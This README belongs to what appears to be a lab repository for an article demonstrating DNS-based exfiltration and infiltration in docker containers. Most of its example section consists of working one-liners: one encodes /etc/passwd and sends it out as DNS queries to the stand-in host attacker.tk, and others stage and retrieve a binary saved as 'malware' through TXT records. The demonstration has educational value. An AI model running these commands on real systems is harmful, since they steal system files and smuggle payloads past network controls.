# DNS infiltration and exfiltration demo
This repository contains codes and examples used for an article.
## Screeshots
![screenshot](/assets/screenshot.jpg)
## Requirements
- docker
- docker-compose
## Usage
Create three containers and two networks:
```
$ docker-compose up -d

```
Open three different terminals and connect to each container:
```
docker exec -ti acme-server sh
docker exec -ti acme-dns sh
docker exec -ti attacker-dns sh

```
or if you have `tmux` installed just run this script to get a layout similar to the screenshot above:
```
tmux-setup.sh
```

## Examples
Send a file through DNS queries:
```
gzip -c /etc/passwd | base64 -w0 | fold -w63 | awk 'BEGIN {n = 100} {print "dig +short c"n"."$1".attacker.tk"; n++}' | sh
```
Reassemble file from query log file:
```
grep -E "query\[A\] c\d{3}\." /var/log/dnsmasq.log | awk '{print $6}' | sort -u | cut -d "." -f2 | base64 -d | gunzip -d > mynewfile
```
Create TXT record from "sl" binary:
```
gzip -c /usr/bin/sl | base64 -w0 | fold -w63 | awk 'BEGIN {n = 100} {print "txt-record=c"n".attacker.tk,"$1; n++}'
```
Get a binary quering TXT records:
```
for n in $(seq 100 222);do echo "dig txt +short c$n.attacker.tk" ;done | sh | tr -d '"' | base64 -d | gzip -d > malware
```